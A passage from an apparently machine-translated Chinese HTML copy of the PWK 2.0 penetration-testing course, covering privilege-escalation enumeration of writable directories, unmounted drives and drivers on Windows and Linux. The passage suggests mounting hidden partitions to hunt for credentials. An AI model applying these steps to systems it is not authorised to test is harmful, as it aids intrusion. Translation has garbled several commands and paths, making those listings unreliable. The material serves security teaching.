<div style="position:absolute;top:104591;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">477 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Linux 手册页项目，2019 年），http://man7.org/linux/man-pages/man1/find.1.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:104719;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="89"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 89 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:104752;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:105829;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:105829;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:105829;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">530</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:104848;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/home/student/.gconf/apps</font></font></nobr></div>
<div style="position:absolute;top:104864;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/home/student/.gconf/apps/gksu</font></font></nobr></div>
<div style="position:absolute;top:104881;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/家/学生/音乐</font></font></nobr></div>
<div style="position:absolute;top:104898;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/home/student/thinclient_drives</font></font></nobr></div>
<div style="position:absolute;top:104916;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/家/学生/视频</font></font></nobr></div>
<div style="position:absolute;top:104932;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/家/学生/.pcsc11</font></font></nobr></div>
<div style="position:absolute;top:104949;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/家/学生/.gnupg</font></font></nobr></div>
<div style="position:absolute;top:104966;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:104985;left:295"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 540 - 列出 Linux 上的所有世界可写目录</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:105015;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如上所示，几个目录似乎是全局可写的，包括 /usr/local/james/bin</font></font></nobr></div>
<div style="position:absolute;top:105035;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目录。</font><font style="vertical-align: inherit;">这当然值得进一步调查。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:105069;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.1.1.10</font></font></i></nobr></div>
<div style="position:absolute;top:105069;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">枚举卸载的磁盘</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:105103;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在大多数系统上，驱动器在启动时自动挂载。</font><font style="vertical-align: inherit;">正因为如此，很容易忘记</font></font></nobr></div>
<div style="position:absolute;top:105122;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关于可能包含有价值信息的未安装驱动器。</font><font style="vertical-align: inherit;">我们应该一直寻找</font></font></nobr></div>
<div style="position:absolute;top:105142;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卸载驱动器，如果存在，请检查安装权限。</font></font></nobr></div>
<div style="position:absolute;top:105175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在基于 Windows 的系统上，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mountvol</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 478</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列出当前挂载的所有驱动器</font></font></nobr></div>
<div style="position:absolute;top:105194;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及那些物理连接但未安装的。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:105229;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">c:\用户\学生&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mountvol</font></font></font></b></nobr></div>
<div style="position:absolute;top:105246;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建、删除或列出卷安装点。</font></font></nobr></div>
<div style="position:absolute;top:105263;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:105280;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VolumeName 和当前挂载点的可能值是：</font></font></nobr></div>
<div style="position:absolute;top:105314;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\\?\音量{25721a7f-0000-0000-0000-100000000000}\</font></font></nobr></div>
<div style="position:absolute;top:105331;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*** 没有安装点 ***</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:105365;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\\?\音量{25721a7f-0000-0000-0000-602200000000}\</font></font></b></nobr></div>
<div style="position:absolute;top:105382;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C：\</font></font></b></nobr></div>
<div style="position:absolute;top:105416;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\\?\卷{78fa00a6-3519-11e8-a4dc-806e6f6e6963}\</font></font></b></nobr></div>
<div style="position:absolute;top:105433;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">D:\</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:105452;left:284"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 541 - 列出可在 Windows 上安装的所有驱动器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:105481;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，系统有两个挂载点分别映射到 C: 和 D: 驱动器。</font><font style="vertical-align: inherit;">我们</font></font></nobr></div>
<div style="position:absolute;top:105501;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另请注意，我们有一个具有全局唯一标识符 (GUID) </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25721a7f-0000-0000- 的卷</font></font></i></nobr></div>
<div style="position:absolute;top:105520;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0000-100000000000</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，没有挂载点。</font><font style="vertical-align: inherit;">这可能很有趣，我们可能想要</font></font></nobr></div>
<div style="position:absolute;top:105540;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进一步调查。</font></font></nobr></div>
<div style="position:absolute;top:105572;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在基于 Linux 的系统上，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mount</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 479</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令列出所有已挂载的文件系统。</font><font style="vertical-align: inherit;">在</font></font></nobr></div>
<div style="position:absolute;top:105592;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此外，/etc/fstab </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">480</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件列出了将在启动时挂载的所有驱动器。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:105654;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请记住，系统管理员可能使用了自定义</font></font></i></nobr></div>
<div style="position:absolute;top:105673;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于挂载</font></font><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/fstab</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件</font><font style="vertical-align: inherit;">中未列出的驱动器的配置或脚本</font><font style="vertical-align: inherit;">。</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:105739;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">478 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mountvol</font></font></font></nobr></div>
<div style="position:absolute;top:105759;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">479 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Linux.die.net，2003 年），https://linux.die.net/man/8/mount</font></font></font></nobr></div>
<div style="position:absolute;top:105779;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">480 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（极客大学，2019），https://geek-university.com/linux/etc-fstab-file/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:105907;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="90"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 90 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:105940;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:107017;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:107017;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:107017;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">531</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:106036;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因此，不仅要扫描</font></font><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/fstab</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，还要收集</font></font></i></nobr></div>
<div style="position:absolute;top:106055;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有关使用</font></font></i><b><font color="#000000" style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mount</font></font></font></b><font style="vertical-align: inherit;"><i><font style="vertical-align: inherit;">安装的驱动器的信息</font></i></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:106119;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat /etc/fstab</font></font></font></b></nobr></div>
<div style="position:absolute;top:106136;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># /etc/fstab：静态文件系统信息。</font></font></nobr></div>
<div style="position:absolute;top:106153;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:106170;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># &lt;文件系统&gt; &lt;挂载点&gt; &lt;类型&gt; &lt;选项&gt; &lt;转储&gt; &lt;pass&gt;</font></font></nobr></div>
<div style="position:absolute;top:106187;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># / 在安装期间位于 /dev/sda1</font></font></nobr></div>
<div style="position:absolute;top:106204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UUID=fa336f7a-8cf8-4cd2-9547-22b08cf58b72 / ext4 错误=remount-ro 0 1</font></font></nobr></div>
<div style="position:absolute;top:106221;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 安装期间交换位于 /dev/sda5</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:106238;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UUID=8b701d25-e290-49dc-b61b-1b9047088150 无交换软件    </font></font></b></nobr></div>
<div style="position:absolute;top:106238;left:692"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 0</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:106255;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/dev/sr0    </font></font></nobr></div>
<div style="position:absolute;top:106255;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/media/cdrom0 udf,iso9660 用户,noauto 0 0</font></font></nobr></div>
<div style="position:absolute;top:106289;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mount</font></font></font></b></nobr></div>
<div style="position:absolute;top:106306;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/sys 上的 sysfs 类型 sysfs（rw、nosuid、nodev、noexec、relatime）</font></font></nobr></div>
<div style="position:absolute;top:106323;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)</font></font></nobr></div>
<div style="position:absolute;top:106340;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">udev on /dev type devtmpfs (rw,nosuid,relatime,size=505664k,nr_inodes=126416,mode=755)</font></font></nobr></div>
<div style="position:absolute;top:106357;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)</font></font></nobr></div>
<div style="position:absolute;top:106374;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=102908k,mode=755)</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:106391;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro,data=ordered)</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:106408;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)</font></font></nobr></div>
<div style="position:absolute;top:106425;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/dev/shm 上的 tmpfs 类型 tmpfs（rw、nosuid、nodev）</font></font></nobr></div>
<div style="position:absolute;top:106442;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)</font></font></nobr></div>
<div style="position:absolute;top:106459;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/sys/fs/cgroup 上的 tmpfs 类型 tmpfs (ro,nosuid,nodev,noexec,mode=755)</font></font></nobr></div>
<div style="position:absolute;top:106476;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:106493;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mqueue on /dev/mqueue type mqueue (rw,relatime)</font></font></nobr></div>
<div style="position:absolute;top:106510;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/dev/hugepages 上的hugetlbfs 类型hugetlbfs (rw,relatime)</font></font></nobr></div>
<div style="position:absolute;top:106527;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">debugfs on /sys/kernel/debug type debugfs (rw,relatime)</font></font></nobr></div>
<div style="position:absolute;top:106543;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/run/user/110 上的 tmpfs 类型 tmpfs (rw,nosuid,nodev,relatime,size=102904k,mode=700,uid=</font></font></nobr></div>
<div style="position:absolute;top:106560;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">gvfsd-fuse on /run/user/110/gvfs type fuse.gvfsd-fuse (rw,nosuid,nodev,relatime,user_i</font></font></nobr></div>
<div style="position:absolute;top:106577;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/sys/fs/fuse/connections 上的 fusectl 类型 fusectl (rw,relatime)</font></font></nobr></div>
<div style="position:absolute;top:106595;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=102904k,mode=700,uid</font></font></nobr></div>
<div style="position:absolute;top:106614;left:248"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 542 - 列出 Linux 上 /etc/fstab 和所有已安装驱动器的内容</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:106643;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出显示了这个 Linux 系统的交换分区和主 ext4 磁盘。</font><font style="vertical-align: inherit;">此外，</font></font></nobr></div>
<div style="position:absolute;top:106663;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用 lsblk </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">481</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查看所有可用磁盘。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:106697;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/bin/lsblk</font></font></font></b></nobr></div>
<div style="position:absolute;top:106714;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称 MAJ:MIN RM SIZE RO TYPE MOUNTPOINT</font></font></nobr></div>
<div style="position:absolute;top:106731;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fd0 2:0 1 4K 0 磁盘 </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:106748;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sda 8:0 0 5G 0 磁盘</font></font></b></nobr></div>
<div style="position:absolute;top:106765;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">├─sda1 8:1 0 4.7G 0 部分 /</font></font></b></nobr></div>
<div style="position:absolute;top:106782;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">├─sda2 8:2 0 1K 0 部分</font></font></b></nobr></div>
<div style="position:absolute;top:106799;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">└─sda5 8:5 0 334M 0 部分 [交换]</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:106836;left:291"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 543 - 在 Linux 上使用 lsblk 列出所有可用驱动器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:106865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们注意到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sda</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">驱动器由三个不同的分区组成，这些分区都有编号。</font><font style="vertical-align: inherit;">在一些</font></font></nobr></div>
<div style="position:absolute;top:106884;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在某些情况下，显示系统上所有本地磁盘的信息可能会显示不是</font></font></nobr></div>
<div style="position:absolute;top:106903;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装。</font><font style="vertical-align: inherit;">根据系统配置（或错误配置），我们可能能够</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:106967;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">481 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Linux.die.net, 2003) https://linux.die.net/man/8/lsblk</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:107095;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="91"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 91 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:107128;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:108205;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:108205;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:108205;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">532</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:107224;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">挂载这些分区并搜索感兴趣的文档、凭据或其他信息</font></font></nobr></div>
<div style="position:absolute;top:107243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以让我们提升我们的特权或在网络中获得更好的立足点。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:107278;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.1.1.11</font></font></i></nobr></div>
<div style="position:absolute;top:107278;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">枚举设备驱动程序和内核模块</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:107312;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另一种常见的提权涉及利用设备驱动程序和内核模块。</font></font></nobr></div>
<div style="position:absolute;top:107331;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将在本模块的后面介绍实际的利用技术，但让我们看看重要的</font></font></nobr></div>
<div style="position:absolute;top:107351;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">枚举技术。</font><font style="vertical-align: inherit;">由于该技术依赖于将漏洞与相应的</font></font></nobr></div>
<div style="position:absolute;top:107370;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用，我们需要编译加载到目标上的驱动程序和内核模块的列表。</font></font></nobr></div>
<div style="position:absolute;top:107403;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Windows 上，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">driverquery</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 482</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">开始搜索</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">我们将提供</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/v</font></font></font></b></nobr></div>
<div style="position:absolute;top:107422;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">详细输出的参数以及</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/fo csv</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以请求</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CSV</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">格式</font><font style="vertical-align: inherit;">的输出</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:107455;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了过滤输出，我们将在</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话中</font><font style="vertical-align: inherit;">运行此命令</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">在 PowerShell 中，我们</font></font></nobr></div>
<div style="position:absolute;top:107474;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将输出通过管道传输到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ConvertFrom-Csv </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">483</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> cmdlet 以及</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Select-Object</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">484</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这将允许</font></font></nobr></div>
<div style="position:absolute;top:107494;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以选择特定的对象属性或对象集，包括</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示名称</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动模式</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font></nobr></div>
<div style="position:absolute;top:107513;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">路径</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:107548;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">c:\用户\学生&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell</font></font></font></b></nobr></div>
<div style="position:absolute;top:107582;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Users\student&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">driverquery.exe /v /fo csv | </font><font style="vertical-align: inherit;">ConvertFrom-CSV | </font><font style="vertical-align: inherit;">选择对象 'Dis</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:107599;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">播放名称'，'开始模式'，路径</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:107633;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示名称    </font></font></nobr></div>
